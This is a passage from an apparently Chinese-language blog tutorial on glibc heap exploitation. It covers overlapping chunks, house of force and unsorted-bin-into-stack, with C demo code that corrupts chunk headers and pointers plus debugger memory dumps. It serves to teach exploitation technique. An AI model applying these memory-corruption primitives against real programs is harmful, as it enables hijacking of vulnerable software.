memset(p3, &#x27;3&#x27;, 80), we have:\n&quot;</span>);</span><br><span class="line"><span class="number">72</span> <span class="built_in">memset</span>(p3, <span class="string">&#x27;3&#x27;</span>, <span class="number">80</span>);</span><br><span class="line"><span class="number">73</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line"><span class="number">74</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p3);</span><br></pre></td></tr></table></figure><h3 id="0x10-overlapping-chunks-2"><a href="#0x10-overlapping-chunks-2" class="headerlink" title="0x10 overlapping_chunks_2"></a>0x10 overlapping_chunks_2</h3><p>同样是堆重叠问题，这里是在 free 之前修改 size 值，使 free 错误地修改了下一个 chunk 的 prev_size 值，导致中间的 chunk 强行合并。</p><p>我们这里 malloc 五块chunk，第五块的作用是防止 chunk 4 被free 后被放入 top chunk。然后这里的覆盖目标是 chunk2 到chunk4。 </p><p>首先 free 掉 chunk 4</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(p4);</span><br></pre></td></tr></table></figure><p>由于 chunk 4现在是 free 状态，这个时候 chunk 5 的presize 如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">PwnLife&gt; p p5</span><br><span class="line"><span class="variable">$3</span> = (intptr_t *) 0x603fd0</span><br><span class="line">PwnLife&gt; x/20gx p5-4</span><br><span class="line">0x603fb0:0x44444444444444440x4444444444444444                  &lt;--- chunk 5</span><br><span class="line">0x603fc0:0x00000000000003f00x00000000000003f0     &lt;---prev size   / size  </span><br><span class="line">0x603fd0:0x45454545454545450x4545454545454545</span><br><span class="line">0x603fe0:0x45454545454545450x4545454545454545</span><br><span class="line">0x603ff0:0x45454545454545450x4545454545454545</span><br><span class="line">0x604000:0x45454545454545450x4545454545454545</span><br><span class="line">0x604010:0x45454545454545450x4545454545454545</span><br><span class="line">0x604020:0x45454545454545450x4545454545454545</span><br><span class="line">0x604030:0x45454545454545450x4545454545454545</span><br><span class="line">0x604040:0x45454545454545450x4545454545454545</span><br><span class="line">PwnLife&gt;</span><br></pre></td></tr></table></figure><p>紧接着，我们假设 chunk 1 有堆溢出，我们可以通过堆溢出修改 chunk 2的size</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>) * <span class="number">2</span>; <span class="comment">//&lt;--- BUG HERE</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; p p2</span><br><span class="line">$<span class="number">4</span> = (<span class="keyword">intptr_t</span> *) <span class="number">0x603400</span></span><br><span class="line">PwnLife&gt; x/<span class="number">20</span>gx p2<span class="number">-2</span></span><br><span class="line"><span class="number">0x6033f0</span>:<span class="number">0x4141414141414141</span><span class="number">0x00000000000007e1</span>      &lt;--- size</span><br><span class="line"><span class="number">0x603400</span>:<span class="number">0x4242424242424242</span><span class="number">0x4242424242424242</span></span><br><span class="line"><span class="number">0x603410</span>:<span class="number">0x4242424242424242</span><span class="number">0x4242424242424242</span></span><br><span class="line"><span class="number">0x603420</span>:<span class="number">0x4242424242424242</span><span class="number">0x4242424242424242</span></span><br><span class="line"><span class="number">0x603430</span>:<span class="number">0x4242424242424242</span><span class="number">0x4242424242424242</span></span><br><span class="line"><span class="number">0x603440</span>:<span class="number">0x4242424242424242</span><span class="number">0x4242424242424242</span></span><br><span class="line"><span class="number">0x603450</span>:<span class="number">0x4242424242424242</span><span class="number">0x4242424242424242</span></span><br><span class="line"><span class="number">0x603460</span>:<span class="number">0x4242424242424242</span><span class="number">0x4242424242424242</span></span><br><span class="line"><span class="number">0x603470</span>:<span class="number">0x4242424242424242</span><span class="number">0x4242424242424242</span></span><br><span class="line"><span class="number">0x603480</span>:<span class="number">0x4242424242424242</span><span class="number">0x4242424242424242</span></span><br><span class="line">PwnLife&gt;</span><br></pre></td></tr></table></figure><p> chunk 2 的 size 值修改为 chunk 2 和 chunk 3 的大小之和，最后的 1 是标志位。这样当我们释放 chunk 2 的时候，malloc 根据这个被修改的 size 值，会以为 chunk 2 加上 chunk 3 的区域都是要释放的，然后就错误地修改了 chunk 5 的 prev_size。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">59</span>   <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow during the free() operation on p2, the allocator is fooled to think that \nthe nextchunk is p4 ( since p2 + size_p2 now point to p4 ) \n&quot;</span>);</span><br><span class="line"><span class="number">60</span>   <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThis operation will basically create a big free chunk that wrongly includes p3\n&quot;</span>);</span><br><span class="line"><span class="number">61</span>   <span class="built_in">free</span>(p2);</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; p p5</span><br><span class="line"><span class="variable">$5</span> = (intptr_t *) 0x603fd0</span><br><span class="line">PwnLife&gt; x/20gx p5-2</span><br><span class="line">0x603fc0:0x0000000000000bd00x00000000000003f0   &lt;--- prev size / size</span><br><span class="line">0x603fd0:0x45454545454545450x4545454545454545</span><br><span class="line">0x603fe0:0x45454545454545450x4545454545454545</span><br><span class="line">0x603ff0:0x45454545454545450x4545454545454545</span><br><span class="line">0x604000:0x45454545454545450x4545454545454545</span><br><span class="line">0x604010:0x45454545454545450x4545454545454545</span><br><span class="line">0x604020:0x45454545454545450x4545454545454545</span><br><span class="line">0x604030:0x45454545454545450x4545454545454545</span><br><span class="line">0x604040:0x45454545454545450x4545454545454545</span><br><span class="line">0x604050:0x45454545454545450x4545454545454545</span><br><span class="line">PwnLife&gt;</span><br></pre></td></tr></table></figure><p>我们会发现，当free 掉 chunk 2 后， chunk 2 ，chunk 3 一起被释放，接着，它发现紧邻的一块 chunk 4 也是 free 状态，就把它俩合并在了一起，组成一个大 free chunk，放进 unsorted bin 中。 chunk 5 的 prev size 也发生了变化。</p><p>然后当我们申请一块新chunk的时候，会从 unsorted bin中取出一部分，比如这里我们申请一块 p6</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p6 = <span class="built_in">malloc</span>(<span class="number">2000</span>);</span><br></pre></td></tr></table></figure><p>即将 chunk 2 chunk 3 的部分拿出来。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; p p6</span><br><span class="line"><span class="variable">$6</span> = (intptr_t *) 0x603400</span><br><span class="line">PwnLife&gt; x/20gx p6-2</span><br><span class="line">0x6033f0:0x41414141414141410x00000000000007e1</span><br><span class="line">0x603400:0x00007ffff7dd21380x00007ffff7dd2138</span><br><span class="line">0x603410:0x00000000006033f00x00000000006033f0</span><br><span class="line">0x603420:0x42424242424242420x4242424242424242</span><br><span class="line">0x603430:0x42424242424242420x4242424242424242</span><br><span class="line">0x603440:0x42424242424242420x4242424242424242</span><br><span class="line">0x603450:0x42424242424242420x4242424242424242</span><br><span class="line">0x603460:0x42424242424242420x4242424242424242</span><br><span class="line">0x603470:0x42424242424242420x4242424242424242</span><br><span class="line">0x603480:0x42424242424242420x4242424242424242</span><br></pre></td></tr></table></figure><p>然后 unsorted bin中剩下的部分就是 chunk4</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x7ffff7dd1b58 (main_arena+88) —▸ 0x603bd0 ◂— 0x7ffff7dd1b58</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">PwnLife&gt; x/20gx 0x603bd0</span><br><span class="line">0x603bd0:0x43434343434343430x00000000000003f1</span><br><span class="line">0x603be0:0x00007ffff7dd1b580x00007ffff7dd1b58</span><br><span class="line">0x603bf0:0x44444444444444440x4444444444444444</span><br><span class="line">0x603c00:0x44444444444444440x4444444444444444</span><br><span class="line">0x603c10:0x44444444444444440x4444444444444444</span><br><span class="line">0x603c20:0x44444444444444440x4444444444444444</span><br><span class="line">0x603c30:0x44444444444444440x4444444444444444</span><br><span class="line">0x603c40:0x44444444444444440x4444444444444444</span><br><span class="line">0x603c50:0x44444444444444440x4444444444444444</span><br><span class="line">0x603c60:0x44444444444444440x4444444444444444</span><br><span class="line">PwnLife&gt;</span><br></pre></td></tr></table></figure><p>这个时候，chunk 6 和chunk 3就已经是同一块 chunk了。</p><h3 id="0x11-house-of-force"><a href="#0x11-house-of-force" class="headerlink" title="0x11 house_of_force"></a>0x11 house_of_force</h3><p>Exploiting the Top Chunk (Wilderness) header in order to get malloc to return a nearly-arbitrary pointer</p><p>house_of_force 是一种通过改写 top chunk 的 size 字段来欺骗 malloc 返回任意地址的技术。我们知道在空闲内存的最高处，必然存在一块空闲的 chunk，即 top chunk，当 bins 和 fast bins 都不能满足分配需要的时候，malloc 会从 top chunk 中分出一块内存给用户。所以 top chunk 的大小会随着分配和回收不停地变化。</p><p>首先随便 malloc 一个 chunk</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; x/20gx 0x603000</span><br><span class="line">0x603000:0x00000000000000000x0000000000000111</span><br><span class="line">0x603010:0x00000000000000000x0000000000000000</span><br><span class="line">0x603020:0x00000000000000000x0000000000000000</span><br><span class="line">0x603030:0x00000000000000000x0000000000000000</span><br><span class="line">0x603040:0x00000000000000000x0000000000000000</span><br><span class="line">0x603050:0x00000000000000000x0000000000000000</span><br><span class="line">0x603060:0x00000000000000000x0000000000000000</span><br><span class="line">0x603070:0x00000000000000000x0000000000000000</span><br><span class="line">0x603080:0x00000000000000000x0000000000000000</span><br><span class="line">0x603090:0x00000000000000000x0000000000000000</span><br><span class="line">PwnLife&gt;</span><br><span class="line">0x6030a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x603100:0x00000000000000000x0000000000000000</span><br><span class="line">0x603110:0x00000000000000000x0000000000020ef1             &lt;--- top chunk</span><br><span class="line">0x603120:0x00000000000000000x0000000000000000</span><br><span class="line">0x603130:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>这个时候我们假设 第一个chunk 有溢出漏洞，我们可以去修改。top chunk 的size</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(<span class="keyword">intptr_t</span> *)((<span class="keyword">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="keyword">long</span>)) = <span class="number">-1</span>;</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; x/20gx 0x603100</span><br><span class="line">0x603100:0x00000000000000000x0000000000000000</span><br><span class="line">0x603110:0x00000000000000000xffffffffffffffff         &lt;--- top chunk </span><br><span class="line">0x603120:0x00000000000000000x0000000000000000</span><br><span class="line">0x603130:0x00000000000000000x0000000000000000</span><br><span class="line">0x603140:0x00000000000000000x0000000000000000</span><br><span class="line">0x603150:0x00000000000000000x0000000000000000</span><br><span class="line">0x603160:0x00000000000000000x0000000000000000</span><br><span class="line">0x603170:0x00000000000000000x0000000000000000</span><br><span class="line">0x603180:0x00000000000000000x0000000000000000</span><br><span class="line">0x603190:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>我们发现，这个时候size被修改为一个 大数。</p><p>现在我们可以 malloc 一个任意大小的内存而不用调用 mmap 了。接下来 malloc 一个 chunk，使得该 chunk 刚好分配到我们想要控制的那块区域为止，这样在下一次 malloc 时，就可以返回到我们想要控制的区域了。计算方法是用目标地址减去 top chunk 地址，再减去 chunk 头的大小。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">67</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> evil_size = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)bss_var - <span class="keyword">sizeof</span>(<span class="keyword">long</span>)*<span class="number">4</span> - (<span class="keyword">unsigned</span> <span class="keyword">long</span>)ptr_top;</span><br><span class="line"><span class="number">68</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n&quot;</span></span><br><span class="line"><span class="number">69</span>    <span class="string">&quot;we will malloc %#lx bytes.\n&quot;</span>, bss_var, ptr_top, evil_size);</span><br><span class="line"><span class="number">70</span> <span class="keyword">void</span> *new_ptr = <span class="built_in">malloc</span>(evil_size);</span><br></pre></td></tr></table></figure><p>这样就成功把。bss_var 给分配了出来</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">0x602050 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x10b9,</span><br><span class="line">  fd = 0x2073692073696854,</span><br><span class="line">  bk = 0x676e697274732061,</span><br><span class="line">  fd_nextsize = 0x6577207461687420,</span><br><span class="line">  bk_nextsize = 0x6f7420746e617720</span><br><span class="line">&#125;</span><br><span class="line">0x603108 &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x0,</span><br><span class="line">  fd = 0xffffffffffffef41,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">PwnLife&gt; x/20s 0x602050</span><br><span class="line">0x602050:<span class="string">&quot;&quot;</span></span><br><span class="line">0x602051:<span class="string">&quot;&quot;</span></span><br><span class="line">0x602052:<span class="string">&quot;&quot;</span></span><br><span class="line">0x602053:<span class="string">&quot;&quot;</span></span><br><span class="line">0x602054:<span class="string">&quot;&quot;</span></span><br><span class="line">0x602055:<span class="string">&quot;&quot;</span></span><br><span class="line">0x602056:<span class="string">&quot;&quot;</span></span><br><span class="line">0x602057:<span class="string">&quot;&quot;</span></span><br><span class="line">0x602058:<span class="string">&quot;\271\020&quot;</span></span><br><span class="line">0x60205b:<span class="string">&quot;&quot;</span></span><br><span class="line">0x60205c:<span class="string">&quot;&quot;</span></span><br><span class="line">0x60205d:<span class="string">&quot;&quot;</span></span><br><span class="line">0x60205e:<span class="string">&quot;&quot;</span></span><br><span class="line">0x60205f:<span class="string">&quot;&quot;</span></span><br><span class="line">0x602060 &lt;bss_var&gt;:<span class="string">&quot;This is a strin&quot;</span>...</span><br><span class="line">0x60206f &lt;bss_var+15&gt;:<span class="string">&quot;g that we want &quot;</span>...</span><br><span class="line">0x60207e &lt;bss_var+30&gt;:<span class="string">&quot;to overwrite.&quot;</span></span><br><span class="line">0x60208c:<span class="string">&quot;&quot;</span></span><br><span class="line">0x60208d:<span class="string">&quot;&quot;</span></span><br><span class="line">0x60208e:<span class="string">&quot;&quot;</span></span><br><span class="line">PwnLife&gt;</span><br></pre></td></tr></table></figure><p>该技术的缺点是会受到 ASLR 的影响，因为如果攻击者需要修改指定位置的内存，他首先需要知道当前 top chunk 的位置以构造合适的 malloc 大小来转移 top chunk。而 ASLR 将使堆内存地址随机，所以该技术还需同时配合使用信息泄漏以达成攻击。</p><h3 id="0x12-unsorted-bin-into-stack"><a href="#0x12-unsorted-bin-into-stack" class="headerlink" title="0x12 unsorted_bin_into_stack"></a>0x12 unsorted_bin_into_stack</h3><p>unsorted-bin-into-stack 通过改写 unsorted bin 里 chunk 的 bk 指针到任意地址，从而在栈上 malloc 出 chunk。</p><p>首先，我们得先malloc 一块 chunk，然后 free 掉，将他放到 unsorted bin里。再这之前，我们也得 malloc 一块 作为缓冲的chunk ，避免目标chunk free 掉后被放入到 topchunk里。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">9</span>   <span class="keyword">intptr_t</span>* victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">11</span>   <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating another chunk to avoid consolidating the top chunk with the small one during the free()\n&quot;</span>);</span><br><span class="line"><span class="number">12</span>   <span class="keyword">intptr_t</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="number">13</span></span><br><span class="line"><span class="number">14</span>   <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);</span><br><span class="line"><span class="number">15</span>   <span class="built_in">free</span>(victim);</span><br></pre></td></tr></table></figure><p>这个时候 victim 就被放入到了 unsortedbin里</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x7ffff7dd1b58 (main_arena+88) —▸ 0x602000 ◂— 0x7ffff7dd1b58</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>紧接着，我们在栈上 fake 一个chunk。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">19</span>   stack_buffer[<span class="number">1</span>] = <span class="number">0x100</span> + <span class="number">0x10</span>;</span><br><span class="line"><span class="number">20</span>   stack_buffer[<span class="number">3</span>] = (<span class="keyword">intptr_t</span>)stack_buffer;</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; p stack_buffer</span><br><span class="line"><span class="variable">$3</span> = &#123;0x0, 0x110, 0x0, 0x7fffffffe3f0&#125;</span><br><span class="line">PwnLife&gt; p &amp;stack_buffer</span><br><span class="line"><span class="variable">$4</span> = (intptr_t (*)[4]) 0x7fffffffe3f0</span><br></pre></td></tr></table></figure><p>让伪造的 chunk 的bk 指向自身。</p><p>然后我们假设，此时有一个 堆溢出漏洞，可以修改 victim chunk的内容。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">24</span>   <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem\n&quot;</span>);</span><br><span class="line"><span class="number">25</span>   victim[<span class="number">-1</span>] = <span class="number">32</span>;</span><br><span class="line"><span class="number">26</span>   victim[<span class="number">1</span>] = (<span class="keyword">intptr_t</span>)stack_buffer; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line"><span class="number">27</span>   <span class="comment">//------------------------------------</span></span><br></pre></td></tr></table></figure><p>我们通过 溢出漏洞修改 victim chunk 的bk，但此前，我们得 pass 一个check</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Size should be different from the next request size to <span class="keyword">return</span> fake_chunk <span class="keyword">and</span> need to pass the check <span class="number">2</span>*SIZE_SZ (&gt; <span class="number">16</span> on x64) &amp;&amp; &lt; av-&gt;system_mem</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">25</span>   victim[<span class="number">-1</span>] = <span class="number">32</span>;</span><br><span class="line"><span class="number">26</span>   victim[<span class="number">1</span>] = (<span class="keyword">intptr_t</span>)stack_buffer; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br></pre></td></tr></table></figure><p>之后，</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; p victim</span><br><span class="line"><span class="variable">$6</span> = (intptr_t *) 0x602010</span><br><span class="line">PwnLife&gt; x/20gx victim</span><br><span class="line">0x602010:0x00007ffff7dd1b580x00007fffffffe3f0</span><br><span class="line">0x602020:0x00000000000000000x0000000000000000</span><br><span class="line">0x602030:0x00000000000000000x0000000000000000</span><br><span class="line">0x602040:0x00000000000000000x0000000000000000</span><br><span class="line">0x602050:0x00000000000000000x0000000000000000</span><br><span class="line">0x602060:0x00000000000000000x0000000000000000</span><br><span class="line">0x602070:0x00000000000000000x0000000000000000</span><br><span class="line">0x602080:0x00000000000000000x0000000000000000</span><br><span class="line">0x602090:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020a0:0x00000000000000000x0000000000000000</span><br><span class="line">PwnLife&gt; x/20gx victim-2</span><br><span class="line">0x602000:0x00000000000000000x0000000000000020</span><br><span class="line">0x602010:0x00007ffff7dd1b580x00007fffffffe3f0   &lt;--- fd,bk /bk --&gt; fake chunk</span><br><span class="line">0x602020:0x00000000000000000x0000000000000000</span><br><span class="line">0x602030:0x00000000000000000x0000000000000000</span><br><span class="line">0x602040:0x00000000000000000x0000000000000000</span><br><span class="line">0x602050:0x00000000000000000x0000000000000000</span><br><span class="line">0x602060:0x00000000000000000x0000000000000000</span><br><span class="line">0x602070:0x00000000000000000x0000000000000000</span><br><span class="line">0x602080:0x00000000000000000x0000000000000000</span><br><span class="line">0x602090:0x00000000000000000x0000000000000000</span><br><span class="line">PwnLife&gt; x/20gx 0x00007fffffffe3f0                 &lt;--- fake chunk</span><br><span class="line">0x7fffffffe3f0:0x00000000000000000x0000000000000110</span><br><span class="line">0x7fffffffe400:0x00000000000000000x00007fffffffe3f0</span><br><span class="line">0x7fffffffe410:0x00007fffffffe5000x3fe51d8840ce6c00</span><br><span class="line">0x7fffffffe420:0x00000000004008600x00007ffff7a303f1</span><br><span class="line">0x7fffffffe430:0x00000000000400000x00007fffffffe508</span><br><span class="line">0x7fffffffe440:0x00000001f7b9a4880x0000000000400686</span><br><span class="line">0x7fffffffe450:0x00000000000000000xda692c6b09ba7393</span><br><span class="line">0x7fffffffe460:0x00000000004005900x00007fffffffe500</span><br><span class="line">0x7fffffffe470:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fffffffe480:0x2596d314d11a73930x2596c3ad1e287393</span><br></pre></td></tr></table></figure><p>那么此时就相当于 fake chunk 已经被链接到 unsorted bin 中。在下一次 malloc 的时候，malloc 会顺着 bk 指针进行遍历，于是就找到了大小正好合适的 fake chunk：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x7ffff7dd1b68 (main_arena+104) —▸ 0x602000 ◂— 0x7ffff7dd1b68</span><br><span class="line">smallbins</span><br><span class="line">0x20: 0x7ffff7dd1b68 